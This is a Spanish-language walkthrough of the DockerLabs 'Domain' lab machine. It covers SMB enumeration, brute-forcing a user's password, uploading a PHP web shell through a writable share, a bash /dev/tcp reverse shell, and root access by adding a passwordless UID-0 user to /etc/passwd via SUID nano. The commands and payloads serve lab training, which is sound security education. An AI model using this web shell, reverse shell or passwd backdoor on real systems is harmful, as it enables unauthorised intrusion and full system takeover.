---
title: DockerLabs - Domain
summary: "Write-up del laboratorio Domain de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_domain"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ nmap -sCV -p80,139,445 172.17.0.2           
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-XX-XXTXX:XX:XX
|_  start_date: N/A
```

## análisis

En la pantalla principal encontramos una breve introducción de que es Samba:

![Desktop View](/20260106173957.webp){: width="972" height="589" .shadow}

Dado que estamos tratando con SMB, vamos a ejecutar un escaneo con **enum4linux** en busca de información útil, donde nos termina revelando los usuarios `james` y `bob`, y varios recursos compartidos a los que no tenemos acceso sin credenciales válidas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ enum4linux -a 172.17.0.2                         
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan  7 11:44:46 2026

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2                                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james    Name: james     Desc:                                                                                           
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob      Name: bob       Desc: 

user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]

[+] Attempting to map shares on 172.17.0.2                                                                                                                              

//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                                                                       
//172.17.0.2/html       Mapping: DENIED Listing: N/A Writing: N/A
```

## acceso inicial (www-data)

Intentamos obtener las credenciales de los usuarios `james` y `bob` por fuerza bruta usando **crackmapexec** (o la versión más actual, que es **nxc**), y tras un rato, obtenemos la del usuario `bob`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ crackmapexec smb 172.17.0.2 -u bob -p /usr/share/seclists/Passwords/rockyou.txt
SMB         172.17.0.2      445    E1E8E5AA2A82     [*] Windows 6.1 Build 0 (name:E1E8E5AA2A82) (domain:E1E8E5AA2A82) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    E1E8E5AA2A82     [-] E1E8E5AA2A82\bob:123456 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    E1E8E5AA2A82     [-] E1E8E5AA2A82\bob:12345 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    E1E8E5AA2A82     [-] E1E8E5AA2A82\bob:123456789 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    E1E8E5AA2A82     [-] E1E8E5AA2A82\bob:password STATUS_LOGON_FAILURE
...
SMB         172.17.0.2      445    E1E8E5AA2A82     [+] E1E8E5AA2A82\bob:**** 
```

Nos conectamos por SMB con **smbclient**, y dentro encontramos un fichero `index.html`, el cual nos bajamos para revisarlo:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ smbclient \\\\172.17.0.2\\html -U "bob%****"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 11 09:35:48 2024
  ..                                  D        0  Thu Apr 11 09:18:47 2024
  index.html                          N     1832  Thu Apr 11 09:21:43 2024

                76798724 blocks of size 1024. 33857628 blocks available
smb: \> get index.html 
getting file \index.html of size 1832 as index.html (298.2 KiloBytes/sec) (average 298.2 KiloBytes/sec)
smb: \> exit
```

Al revisarlo, nos damos cuenta de que es muy probable que sea el que vemos en la pantalla principal del servidor web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ cat index.html 
<!DOCTYPE html>
<html lang="es">
<head>
    ...
</head>
<body>
    <div class="container">
        <h1>¿Qué es Samba?</h1>
        <p>Samba es una implementación de software libre del protocolo de archivos compartidos de Microsoft Windows para sistemas operativos tipo Unix. Permite que sistemas operativos Unix compartan archivos e impresoras en una red de área local utilizando el protocolo SMB/CIFS.</p>
        
        <h2>¿Para qué sirve Samba?</h2>
        <p>Samba es útil en entornos donde hay una mezcla de sistemas operativos, incluidos Windows y sistemas basados en Unix como Linux o macOS. Con Samba, los usuarios de Windows pueden acceder a archivos y recursos compartidos en servidores Unix, y viceversa.</p>
        
        <p>Además de compartir archivos, Samba también puede actuar como un controlador de dominio en redes Windows, proporcionando autenticación y servicios de directorio.</p>
        
        <p>En resumen, Samba es una herramienta fundamental para la interoperabilidad entre sistemas Windows y Unix en redes empresariales y domésticas.</p>
    </div>
</body>
</html>
```

Si es este el caso, lo que podemos hacer es subir un script que nos permita ejecutar comandos de forma remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ nvim cmd.php
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ cat cmd.php         
<?php
        system($_GET['cmd']);
?>
```

Una vez creado el script, lo subimos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ smbclient \\\\172.17.0.2\\html -U "bob%star"
Try "help" to get a list of possible commands.
smb: \> put cmd.php
putting file cmd.php as \cmd.php (2.6 kB/s) (average 2.6 kB/s)
smb: \> ls
  .                                   D        0  XXX XXX  7 XX:XX:XX 2026
  ..                                  D        0  Thu Apr 11 09:18:47 2024
  index.html                          N     1832  Thu Apr 11 09:21:43 2024
  cmd.php                             A       32  XXX XXX  7 XX:XX:XX 2026

                76798724 blocks of size 1024. 33857552 blocks available
```

Si ahora tratamos de acceder a este script desde el navegador, deberíamos poder ejecutar comandos:

```bash
http://172.17.0.2/cmd.php?cmd=id
```

![Desktop View](/20260107132119.webp){: width="972" height="589" .shadow}

Procedemos a obtener una reverse shell poniéndonos en escucha en una consola con **nc**, y  ejecutando el siguiente comando (hay que codificar los `&` a `%26` para que no entre en conflicto):

```bash
http://172.17.0.2/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261'
```

En la consola donde estamos en escucha deberíamos haber obtenido la reverse shell:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ nc -nlvp 4444             
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38110
www-data@e1e8e5aa2a82:/var/www/html$ whoami
whoami
www-data
www-data@e1e8e5aa2a82:/var/www/html$ hostname -I
hostname -I
172.17.0.2
```

Ahora trataremos la TTY para tener una consola completamente interactiva:

```bash
www-data@e1e8e5aa2a82:/var/www/html$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@e1e8e5aa2a82:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Domain]
└─$ stty raw -echo;fg                           
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@e1e8e5aa2a82:/var/www/html$ export TERM=xterm
www-data@e1e8e5aa2a82:/var/www/html$ export SHELL=bash
www-data@e1e8e5aa2a82:/home$ stty rows 48 columns 210
```

En el fichero `/etc/passwd` comprobamos si hay más usuarios que tengan asignada una consola, pero únicamente encontramos los siguientes:

```bash
www-data@e1e8e5aa2a82:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
james:x:1001:1001:james,,,:/home/james:/bin/bash
```

## movimiento lateral (bob)

Dado que sabemos la contraseña del usuario `bob`, podemos obtener una consola como este usuario:

```bash
www-data@e1e8e5aa2a82:/home$ su bob
Password: 
bob@e1e8e5aa2a82:/home$ whoami
bob
```

## escalada de privilegios (root)

Buscamos los binarios cuyos permisos sean SUID (se pueden ejecutar con los permisos del propietario), donde notamos que hay uno que no suele ser común ver (**/usr/bin/nano**):

```bash
bob@e1e8e5aa2a82:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/nano
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Tener permisos SUID sobre editores de texto como `nano` lo que nos permite llegar a modificar cualquier fichero dentro del sistema, ya que el propietario suele ser el usuario `root` o algún otro usuario privilegiado.

Lo que haremos en este caso es modificar el fichero `/etc/passwd` para añadir un nuevo usuario privilegiado:

```bash
bob@e1e8e5aa2a82:/home$ nano /etc/passwd
```

La siguiente línea es la que debemos indicar en fichero `/etc/passwd`:

```bash
root2::0:0::/root:/bin/bash
```

Los valores del campo de nombre, la contraseña, la carpeta personal o la shell asignada pueden variar, pero el **UID** y el **GID** deben ser 0 para que el usuario sea privilegiado (**root**), tal y como se indica en la siguiente [imagen](https://sliceoflinux.wordpress.com/files/2009/03/etc-passwd.png), la cual explica la estructura de los registros del fichero `/etc/passwd`:

![Desktop View](/20260107141330.webp){: width="800" height="520" .shadow}

Teniendo esto claro, procedemos a modificar el fichero `/etc/passwd` y revisamos que el resultado sea el siguiente:

```bash
bob@e1e8e5aa2a82:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
james:x:1001:1001:james,,,:/home/james:/bin/bash
root2::0:0::/root:/bin/bash
```

Si ahora probamos a conectarnos como el nuevo usuario, veremos que nos otorga la contraseña sin pedirnos la contraseña:

```bash
bob@e1e8e5aa2a82:/home$ su root2
root@e1e8e5aa2a82:/home# whoami
root
```

Con esto habremos completado la máquina `Domain`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>